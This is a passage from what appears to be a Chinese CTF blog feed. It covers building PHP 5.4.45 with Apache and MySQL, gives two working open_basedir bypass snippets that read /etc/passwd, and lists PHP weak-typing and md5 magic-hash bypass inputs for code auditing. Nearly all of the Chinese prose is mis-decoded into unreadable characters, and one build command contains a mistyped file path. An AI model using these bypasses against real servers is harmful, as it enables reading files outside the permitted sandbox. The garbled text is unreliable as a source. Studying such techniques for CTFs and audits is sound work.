åæç¤ºçš„å‘½ä»¤ï¼Œä¸çŸ¥é“å…·ä½“æ˜¯ä»€ä¹ˆä½œç”¨</span><br>/usr/share/apr-1.0/build/libtool --finish /root/php-5.4.45/libs<br><span class="hljs-comment"># åˆ›å»º php.ini æ–‡ä»¶</span><br><span class="hljs-built_in">mv</span> /root/php-5.4.45/php.ini-development /home/php/php5445/execdir/lib/php.ini<br><span class="hljs-comment"># é…ç½®ç¯å¢ƒå˜äº†</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;/home/php/php5445/execdir/bin/:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-comment"># åˆ·æ–°ç¯å¢ƒ</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><ul><li>å®‰è£…ç›®å½•åœ¨ <code>/home/php/php5445</code></li><li>æ‰§è¡Œæ–‡ä»¶ç›®å½•åœ¨ <code>/home/php/php5445/execdir/bin</code></li></ul><p>ç”±äºæˆ‘ä»¬å¹¶æ²¡æœ‰é™„å¸¦ä»»ä½•å…¶ä»–å‚æ•°ï¼Œæ‰§è¡Œçš„æ˜¯ PHP çš„é»˜è®¤å®‰è£…ï¼Œæ‰€ä»¥åªå®‰è£…äº†å¦‚ä¸‹æ¨¡å—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Core ctype <span class="hljs-built_in">date</span> dom ereg fileinfo filter <span class="hljs-built_in">hash</span> iconv json libxml pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter<br></code></pre></td></tr></table></figure><ol start="3"><li>æˆ‘ä»¬ä½¿ç”¨é»˜è®¤é…ç½®ç¼–è¯‘phpï¼Œå¦‚æœéœ€è¦å®‰è£…å…¶ä»–æ‰©å±•ï¼Œå¯èƒ½éœ€è¦å¦‚ä¸‹åº“ã€‚ï¼ˆä¸‹æ–‡æˆ‘ä»¬ä¼šç¤ºä¾‹ä»‹ç»å¦‚ä½•ç¼–è¯‘å®‰è£…mysqlæ‰©å±•ï¼‰</li></ol><h2 id="å¦‚ä½•ç¼–è¯‘å…¶ä»–æ¨¡å—"><a href="#å¦‚ä½•ç¼–è¯‘å…¶ä»–æ¨¡å—" class="headerlink" title="å¦‚ä½•ç¼–è¯‘å…¶ä»–æ¨¡å—"></a>å¦‚ä½•ç¼–è¯‘å…¶ä»–æ¨¡å—</h2><p>å¯¹äºæ—¥å¸¸å¯èƒ½ç”¨çš„æ¨¡å—ï¼Œæˆ‘ä»¬éœ€è¦å…ˆä¸‹è½½å¦‚ä¸‹åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install zlib1g-dev libbz2-dev libcurl4-openssl-dev openssl libssl-dev libpng-dev libjpeg-dev libmcrypt-dev libedit-dev libreadline-dev libmysqlclient-dev<br></code></pre></td></tr></table></figure><ul><li><code>libedit-dev libreadline-dev</code> æ˜¯ <code>php -a</code> ä¹Ÿå°±æ˜¯ php äº¤äº’æ¨¡å¼éœ€è¦çš„åº“ (readline æ¨¡å—)</li></ul><p>æˆ‘ä¼šåœ¨ä¸‹æ–‡ç¤ºä¾‹ç¼–è¯‘å®‰è£… pdo_mysql åº“ï¼Œå…¶ä»–åº“çš„å®‰è£…å¤§åŒå°å¼‚ã€‚</p><h1 id="é…åˆapache2"><a href="#é…åˆapache2" class="headerlink" title="é…åˆapache2"></a>é…åˆapache2</h1><h2 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ¢ç›‘å¬ç«¯å£</span><br>sed -i <span class="hljs-string">&#x27;s|Listen 80|Listen 8888|&#x27;</span> /etc/apache2/ports.conf<br><span class="hljs-comment">#è®¾ç½®phpæ–‡ä»¶å¤„ç†æ¨¡å—</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;U2VydmVyTmFtZSBsb2NhbGhvc3QKCjxGaWxlc01hdGNoIFwucGhwJD4KICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlc01hdGNoPg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d &gt;&gt; /etc/apache2/apache2.conf<br><br><span class="hljs-comment"># å› ä¸ºæˆ‘ä»¬ç¼–è¯‘çš„phpæ˜¯çº¿ç¨‹ä¸å®‰å…¨å‹ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®ä¸€ä¸‹apache</span><br>a2dismod mpm_event<br>a2enmod mpm_prefork<br><br><span class="hljs-comment">#é‡å¯apache2</span><br>service apache2 restart<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://ip:8888</code>  æˆåŠŸè¿è¡Œ<img src="/../img/1.png"></p><h1 id="é…åˆMysql"><a href="#é…åˆMysql" class="headerlink" title="é…åˆMysql"></a>é…åˆMysql</h1><h2 id="å®‰è£…-mysql5-7"><a href="#å®‰è£…-mysql5-7" class="headerlink" title="å®‰è£… mysql5.7"></a>å®‰è£… <code>mysql5.7</code></h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install mysql-client-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> mysql-server-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> -y<br><span class="hljs-comment"># è¾“å…¥å¯†ç </span><br></code></pre></td></tr></table></figure><h2 id="ç¼–è¯‘å®‰è£…-mysqlnd-æ‰©å±•ï¼ˆå¿…é¡»å…ˆå®‰è£…å®ƒï¼‰"><a href="#ç¼–è¯‘å®‰è£…-mysqlnd-æ‰©å±•ï¼ˆå¿…é¡»å…ˆå®‰è£…å®ƒï¼‰" class="headerlink" title="ç¼–è¯‘å®‰è£… mysqlnd æ‰©å±•ï¼ˆå¿…é¡»å…ˆå®‰è£…å®ƒï¼‰"></a>ç¼–è¯‘å®‰è£… <code>mysqlnd</code> æ‰©å±•ï¼ˆå¿…é¡»å…ˆå®‰è£…å®ƒï¼‰</h2><p>å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿›å…¥mysqlçš„extç›®å½•</span><br><span class="hljs-built_in">cd</span> /root/php-5.4.45/ext/mysqlnd<br><span class="hljs-built_in">mv</span> config9.m4 config.m4<br>phpize<br>./configure --with-php-config=$(<span class="hljs-built_in">which</span> php-config)<br><span class="hljs-comment"># æ‰§è¡Œ make å‘½ä»¤ä¼šå‡ºç°æŠ¥é”™ï¼Œçœ‹ä¸‹æ–‡å³å¯è§£å†³ï¼Œè§£å†³åå†ç»§ç»­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</span><br>make<br></code></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°æŠ¥é”™å¦‚ä¸‹:</p><p><img src="/../img/2.png"></p><p>æ‰§è¡Œä¸‹åˆ—å‘½ä»¤å³å¯è§£å†³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ¢php_mysqlnd_config.hä¸º config.h</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd/php_mysqlnd_config.h|ext/mysqlnd/config.h|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portability.h<br><span class="hljs-comment"># æ›´æ¢ç›¸å¯¹è·¯å¾„ä¸ºç»å¯¹è·¯å¾„</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd|/root/php-5.4.45/ext/mysqlnd|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portabilit.h<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç»§ç»­æ‰§è¡Œå‘½ä»¤makemake install# æ›´æ”¹ /home/php/php5445/execdir/lib/php.ini é…ç½®echo extension=mysqlnd.so &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>php -a</code> å¯çœ‹åˆ°æˆåŠŸåŠ è½½<img src="/../img/3.png"></p><h2 id="ç¼–è¯‘å®‰è£…-pdo-msyql-æ‰©å±•"><a href="#ç¼–è¯‘å®‰è£…-pdo-msyql-æ‰©å±•" class="headerlink" title="ç¼–è¯‘å®‰è£… pdo_msyql æ‰©å±•"></a>ç¼–è¯‘å®‰è£… <code>pdo_msyql</code> æ‰©å±•</h2><p>æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿›å…¥ pdo_mysql æºæ–‡ä»¶å¤¹cd /root/php-5.4.45/ext/pdo_mysql/phpize./configure --with-php-config=$(which php-config) --with-pdo-mysqlmakemake installecho &quot;extension=pdo_mysql.so&quot; &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹phpå®‰è£…çš„æ¨¡å— <code>php -m</code> ï¼ŒæˆåŠŸå®‰è£… pdo_mysql æ‰©å±• <img src="/images/6.png"></p><h2 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h2><ol><li>å¯åŠ¨ç¯å¢ƒ</li></ol><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"># å¯åŠ¨ mysqlservice mysql restart# å¯åŠ¨ apacheservice apache2 restart<br></code></pre></td></tr></table></figure><ol start="2"><li>æ›´æ”¹ index.php ä»£ç </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHANCnRyeSB7DQogICAgJGRiaCA9IG5ldyBQRE8oJ215c3FsOmhvc3Q9MTI3LjAuMC4xO2RibmFtZT1teXNxbCcsICdyb290JywgJ3Jvb3QnKTsNCiAgICBmb3JlYWNoKCRkYmgtPnF1ZXJ5KCdzaG93IGRhdGFiYXNlcycpIGFzICRyb3cpIHsNCiAgICAgICAgcHJpbnRfcigkcm93KTsNCiAgICB9DQogICAgJGRiaCA9IG51bGw7DQp9IGNhdGNoIChQRE9FeGNlcHRpb24gJGUpIHsNCiAgICBwcmludCAiRXJyb3IhOiAiIC4gJGUtPmdldE1lc3NhZ2UoKSAuICI8YnIvPiI7DQogICAgZGllKCk7DQp9DQo/Pg==&quot;</span> |<span class="hljs-built_in">base64</span> -d &gt; /var/www/html/index.php<br></code></pre></td></tr></table></figure><p><img src="/../img/5.png"></p><p>è®¿é—® <code>curl localhost:8888</code></p><p><img src="/../img/1.png"></p><p>ç¯å¢ƒé…ç½®æˆåŠŸã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»•è¿‡open_basedir</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/"/>
    <url>/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/</url>
    
    <content type="html"><![CDATA[<h1 id="ç»•è¿‡open-basedir"><a href="#ç»•è¿‡open-basedir" class="headerlink" title="ç»•è¿‡open_basedir"></a>ç»•è¿‡open_basedir</h1><p><a href="https://xz.aliyun.com/t/10070">https://xz.aliyun.com/t/10070</a></p><h2 id="åˆ©ç”¨ini-setå’Œchidr"><a href="#åˆ©ç”¨ini-setå’Œchidr" class="headerlink" title="åˆ©ç”¨ini_setå’Œchidr"></a>åˆ©ç”¨ini_setå’Œchidr</h2><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li>twitter</li><li><a href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></li></ul><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>chdir(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>$a=file_get_contents(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>var_dump($a);<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨symlink"><a href="#åˆ©ç”¨symlink" class="headerlink" title="åˆ©ç”¨symlink"></a>åˆ©ç”¨symlink</h2><h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li>twitter</li></ul><h3 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ¯æ¬¡è¦æ›´æ¢æ–‡ä»¶å¤¹aå’Œbarå’Œfooï¼Œä¸ç„¶ä¼šæŠ¥é”™æ–‡ä»¶å·²å­˜åœ¨ã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>å…¶ä»–ç‰ˆæœ¬çš„ php ç¯å¢ƒæ­å»ºå¤§åŒå°å¼‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä»£ç å®¡è®¡</title>
    <link href="/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="phpå‡½æ•°æ¼æ´"><a href="#phpå‡½æ•°æ¼æ´" class="headerlink" title="phpå‡½æ•°æ¼æ´"></a>phpå‡½æ•°æ¼æ´</h1><h2 id="1"><a href="#1" class="headerlink" title="(1) = == ==="></a>(1) <code>=</code> <code>==</code> <code>===</code></h2><ul><li><code>=</code> èµ‹å€¼</li><li><code>==</code> ä¸ <code>!=</code> å°†ç±»å‹è½¬ä¸ºç›¸åŒç±»å‹å†æ¯”è¾ƒ<ul><li>å­—ç¬¦ä¸²ä¸­å« <code>.eE</code> ä¸”æ»¡è¶³æ•°å€¼åœ¨æ•´æ•°èŒƒå›´è§£é‡Šä¸º <code>float</code>ï¼Œä½† <code>float</code> ä¸­æœ‰ä¸æ˜¯æ­£å¸¸çš„ä¸œè¥¿å°±æ˜¯ <code>0</code></li><li><code>&quot;admin&quot; == 0</code>ã€<code>&quot;1admin&quot; == 1</code>ã€<code>&quot;admin1&quot; == 0</code></li><li><code>1 + &quot;bob-1.3e3&quot; == 1</code> </li><li>ä»¥ <code>0e</code> å¼€å¤´çš„è¢«é»˜è®¤ä¸º <code>0</code></li><li><code>1</code> è¡¨ç¤ºä¸º <code>true</code>ï¼Œ<code>0</code> æ˜¯ <code>false</code> å’Œ <code>null</code></li><li>æ•°ç»„è¡¨ç¤º <code>null</code> å’Œ <code>false</code></li><li><code>true == -1</code> </li><li><code>&quot;-1&quot; == -1</code></li><li><code>1.0000000000000001 == 1</code></li></ul></li><li><code>===</code> ä¸ <code>!==</code> å¼ºæ¯”è¾ƒï¼Œç±»å‹å’Œå€¼éƒ½æ¯”<ul><li><code>array === array</code></li><li><code>name[] = a</code></li></ul></li><li>æ¯”è¾ƒæ¼æ´ - è¿›åˆ¶æ¯”è¾ƒ<ul><li><p>åœ¨ PHP ä¸­ï¼Œåªè¦å¼€å¤´ä¸º <code>0X</code> çš„å­—ç¬¦ä¸²ä¼šè¢«è®¤ä¸ºæ˜¯ 16 è¿›åˆ¶ï¼Œåœ¨å¼±ç±»å‹æ¯”è¾ƒæ¼æ´ä¸­ï¼Œ16 è¿›åˆ¶ä¼šå…ˆè¢«è½¬æ¢æˆ 10 è¿›åˆ¶å†è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥åªè¦ä¼ å…¥ä¸€ä¸ªå¸¦æœ‰ <code>0x</code> çš„å­—ç¬¦ä¸²ä¹Ÿèƒ½å¤Ÿä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒå¹¶ä¸”è¿”å› <code>true</code>ã€‚</p></li><li><p>åœ¨ PHP ä¸­, å¦‚æœ <code>bool</code> å’Œ â€œä»»ä½•å…¶ä»–ç±»å‹â€ æ¯”è¾ƒï¼Œâ€ä»»ä½•å…¶ä»–ç±»å‹â€ ä¼šè½¬æ¢ä¸º <code>bool</code>ã€‚</p></li><li><p>åœ¨ PHP ä¸­å½“è½¬æ¢ä¸º boolean æ—¶ï¼Œä»¥ä¸‹å€¼è¢«è®¤ä¸ºæ˜¯ <code>FALSE</code>ï¼š</p><ol><li>å¸ƒå°”å€¼ <code>FALSE</code> æœ¬èº«</li><li>æ•´å‹å€¼ <code>0</code>ï¼ˆé›¶ï¼‰</li><li>æµ®ç‚¹å‹å€¼ <code>0.0</code>ï¼ˆé›¶ï¼‰</li><li>ç©ºå­—ç¬¦ä¸²ï¼Œä»¥åŠå­—ç¬¦ä¸² â€œ0â€</li><li>ä¸åŒ…æ‹¬ä½•å…ƒç´ çš„æ•°ç»„ï¼ˆæ³¨æ„ï¼Œä¸€æ—¦åŒ…å«å…ƒç´ ï¼Œå°±ç®—åŒ…å«çš„å…ƒç´ åªæ˜¯ä¸€ä¸ªç©ºæ•°ç»„ï¼Œä¹Ÿæ˜¯ <code>true</code>ï¼‰</li><li>ä¸åŒ…æ‹¬ä»»ä½•æˆå‘˜å˜é‡çš„å¯¹è±¡ï¼ˆä»… PHP 4.0 é€‚ç”¨ï¼‰</li><li>ç‰¹æ®Šç±»å‹ <code>NULL</code>ï¼ˆåŒ…æ‹¬å°šæœªèµ‹å€¼çš„å˜é‡ï¼‰</li><li>ä»ç©ºæ ‡è®°ç”Ÿæˆçš„ SimpleXML å¯¹è±¡</li><li>æ‰€æœ‰å…¶å®ƒå€¼åŒ…æ‹¬ <code>-1</code> éƒ½è¢«è®¤ä¸ºæ˜¯ <code>TRUE</code> ï¼ˆåŒ…æ‹¬ä»»ä½•èµ„æºï¼‰</li></ol></li></ul></li></ul><h2 id="2-intval"><a href="#2-intval" class="headerlink" title="(2) intval"></a>(2) <code>intval</code></h2><ul><li>è½¬æ¢ä¸ºæ•´å‹ï¼Œåœ¨ PHP5 å·¦å³ <code>intval(a)</code> ä¸ <code>intval(a + 1)</code>ï¼Œ<code>a</code> ä¼ å…¥ <code>2e5</code> è¿”å› <code>2</code> å’Œ <code>200001</code></li><li><code>intval()</code> è½¬æ¢çš„æ—¶å€™ï¼Œä¼šå°†ä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ï¼Œ<code>intval()</code> ä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å› <code>0</code>ã€‚</li><li><code>877%00a</code>ï¼Œå†ç”¨ <code>intval</code> å‡½æ•°è·å–æ•´æ•°éƒ¨åˆ†å¾—åˆ° <code>877</code></li></ul><h2 id="3-md5"><a href="#3-md5" class="headerlink" title="(3) md5"></a>(3) <code>md5</code></h2><ul><li><code>md5 == md5($md5)</code></li><li>å¸¸è§ MD5 åŠ å¯†åä¸º <code>0e</code> å¼€å¤´çš„å­—ç¬¦ä¸²ä¸ºï¼š<code>QNKCDZO</code>ã€<code>s878926199a</code>ã€<code>s155964671a</code>ã€<code>s214587387a</code> ç­‰ã€‚</li><li>å› ä¸º <code>md5</code> å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼ŒåŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å› <code>NULL</code>ï¼Œå¯¹äºè¿™ç§æƒ…å†µä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡æŸäº›åœºæ™¯ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ <code>sha1()</code>&#x2F;<code>strlen()</code>&#x2F;<code>strcmp()</code>&#x2F;<code>strpos()</code>ã€‚</li><li>å¯¹äºä½¿ç”¨ <code>===</code> å¼ºæ¯”è¾ƒçš„æƒ…å†µï¼Œä¸Šè¿°æ–¹æ³•å‡å¤±æ•ˆã€‚ä¸è¿‡å¯ä»¥ä½¿ç”¨ MD5 åŠ å¯†åçš„ä¸¤ä¸ªå®Œå…¨ç›¸ç­‰çš„å­—ç¬¦ä¸²æ¥è¿›è¡Œç»•è¿‡ï¼Œå¯ä»¥åˆ©ç”¨ <code>fastcoll</code> æ¥ç”Ÿæˆï¼š<code>fastcoll_v1.0.0.5.exe -p 1.txt -o 1</code></li></ul><h2 id="4-å˜é‡è¦†ç›–"><a href="#4-å˜é‡è¦†ç›–" class="headerlink" title="(4) å˜é‡è¦†ç›–"></a>(4) å˜é‡è¦†ç›–</h2><ol><li><p><strong><code>extract</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">   <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>   <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;C&quot;</span>);<br>   <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$array</span>);<br>   <br>   - å°±ä¼šæœ‰ `abc` è¿™å‡ ä¸ªå˜é‡äº†ï¼Œå¹¶ä¸”æ˜¯ `ABC`ã€‚<br>   - `<span class="hljs-title function_ invoke__">extract</span>()` å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œå½“å˜é‡ä¸­æœ‰åŒåçš„å…ƒç´ æ—¶ï¼Œè¯¥å‡½æ•°é»˜è®¤å°†åŸæœ‰çš„å€¼è¦†ç›–æ‰ã€‚<br><br><span class="hljs-number">2</span>. **`parse_str` å‡½æ•°**<br>   ```php<br>   <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=uert&amp;age=68&quot;</span>, <span class="hljs-variable">$myarr</span>);<br></code></pre></td></tr></table></figure><ul><li>å°† <code>name</code> å’Œ <code>age</code> ä¼ å…¥æ•°ç»„ä¸­  </li><li><code>parse_str</code> å‡½æ•°å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ï¼Œå¦‚æœè®¾ç½®äº†ç¬¬äºŒä¸ªå˜é‡ <code>result</code>ï¼Œå˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£ã€‚</li></ul></li><li><p><strong><code>$$</code> å˜é‡è¦†ç›–</strong></p><ul><li><code>$$</code> å˜é‡è¦†ç›–è¦å…·ä½“ç»“åˆä»£ç æ¥çœ‹ï¼Œå¯èƒ½ä¼šéœ€è¦å€ŸåŠ©æŸä¸ªå‚æ•°è¿›è¡Œä¼ é€’å€¼ï¼Œä¹Ÿæœ‰å¯èƒ½ä½¿ç”¨ <code>$GLOBALS</code>ï¼ˆå¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ï¼‰æ¥åšé¢˜ã€‚</li></ul></li></ol><h2 id="5-ä¼ªéšæœºæ•°"><a href="#5-ä¼ªéšæœºæ•°" class="headerlink" title="(5) ä¼ªéšæœºæ•°"></a>(5) ä¼ªéšæœºæ•°</h2><ul><li><code>mt_rand</code></li><li><code>mt_srand</code></li></ul><h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="(6) ereg()"></a>(6) <code>ereg()</code></h2><ul><li>å­—ç¬¦ä¸²å¯¹æ¯”è§£æï¼Œ<code>ereg</code> å‡½æ•°å­˜åœ¨ <code>NULL</code> æˆªæ–­æ¼æ´ï¼Œå½“ <code>ereg</code> è¯»å–å­—ç¬¦ä¸²æ—¶, å¦‚æœé‡åˆ°äº† <code>%00</code>ï¼Œåé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æã€‚</li><li>æ³¨ï¼šè¿™é‡Œçš„ <code>%00</code> æ˜¯éœ€è¦ <code>urldecode</code> æ‰å¯ä»¥æˆªæ–­çš„ï¼Œè¿™æ˜¯ URL ç»ˆæ­¢ç¬¦ï¼Œä¸” <code>%00</code> é•¿åº¦æ˜¯ 1 ä¸æ˜¯ 3ã€‚</li></ul><h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="(7) is_numeric()"></a>(7) <code>is_numeric()</code></h2><ul><li>åˆ©ç”¨æ•°ç»„ + åå…­è¿›åˆ¶æ¥è¿›è¡Œç»•è¿‡ï¼š<code>a[]=58B</code> åœ¨ PHP 4.x å’Œ 5.x ä¸­å¯¼è‡´è¿™ä¸ªæ•°ç»„å…ƒç´ è¢«è¯¯å¤„ç†ä¸ºæ•°å­—ã€‚</li><li>å¯¹äºç©ºå­—ç¬¦ <code>%00</code>ï¼Œæ— è®ºæ˜¯ <code>%00</code> æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ <code>%20</code> ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åå¦‚ <code>58%20s_numeric()</code> ä»ç„¶ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸€ä¸ªæ•°å­—ã€‚</li><li>16 è¿›åˆ¶ä¹Ÿå¯ä»¥ç»•è¿‡ 